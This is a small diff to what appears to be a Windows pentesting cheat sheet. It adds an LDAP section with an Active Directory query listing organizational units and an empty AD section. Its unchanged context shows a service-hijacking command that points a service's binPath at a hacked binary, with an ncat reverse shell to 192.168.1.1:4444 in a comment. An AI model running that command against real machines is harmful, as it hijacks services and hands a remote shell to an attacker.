@@ -136,3 +136,14 @@ psservice setconfig someservice auto
 sc config someservice binPath="c:\hacked\binary.exe" # "ncat.exe 192.168.1.1 4444 -e cmd.exe"
 ```
 
+## LDAP
+
+```
+Get-ADObject -LDAPFilter '(&(objectClass=organizationalUnit)(!(OU=Domain Controllers)))'
+```
+
+## AD
+
+```
+
+```
